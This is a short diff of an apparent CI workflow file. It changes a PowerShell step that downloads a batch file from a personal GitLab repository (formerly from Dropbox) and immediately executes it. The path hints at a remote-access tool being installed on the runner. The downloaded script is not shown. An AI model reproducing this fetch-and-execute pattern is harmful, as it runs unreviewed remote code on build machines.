@@ -47,7 +47,7 @@ jobs:
 
       - name: ติดตั้งทรัพยากร
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/mnhx2zdt3x848m86e091j/Downloads.bat?rlkey=ygpkefztvhrzptmgku6u80feu&st=steoce2v&dl=0" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://gitlab.com/mcfirsting1/my-pc/-/raw/main/lite_manager_win/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
           Start-Process -FilePath "cmd.exe" -ArgumentList "/c Downloads.bat" -NoNewWindow -Wait
 
 
